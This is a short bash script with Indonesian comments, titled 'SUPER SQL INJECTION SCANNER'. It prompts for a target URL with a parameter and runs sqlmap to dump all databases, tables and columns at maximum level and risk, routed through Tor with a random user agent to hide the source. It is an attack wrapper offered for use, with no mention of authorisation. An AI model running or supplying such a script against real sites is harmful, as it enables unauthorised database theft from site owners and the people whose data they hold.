#!/bin/bash

# Warna
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
blue='\e[94m'
magenta='\e[95m'
cyan='\e[96m'
reset='\e[0m'

# tampilan
clear
echo -e "${cyan}  >>> SUPER SQL INJECTION SCANNER <<<${reset}"
echo ""

#ini loading
loading_bar() {
    bar=">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    for i in {1..35}; do
        echo -ne "\r${yellow}[*] Scan Dulu ${bar:0:$i}${reset}"
        sleep 0.05
    done
    echo -e "\n"
}


read -p "$(echo -e ${green}"•=•>> [ LINK WEB : "${reset})" target

# URL
if [[ "$target" != *"="* ]]; then
    echo -e "${red}[!] ERROR: PARAMETER TIDAK ADA : index.php?id=1)${reset}"
    exit 1
fi

# Scan
echo -e "${green}>> SCAN DI GASIN <<${reset}"
loading_bar

sqlmap -u "$target" --batch --dbs --tables --columns --dump \
--level=5 --risk=3 --threads=10 --random-agent --tor --time-sec=10

# sukses
echo -e "${green}[✔] Sudah bos${reset}"
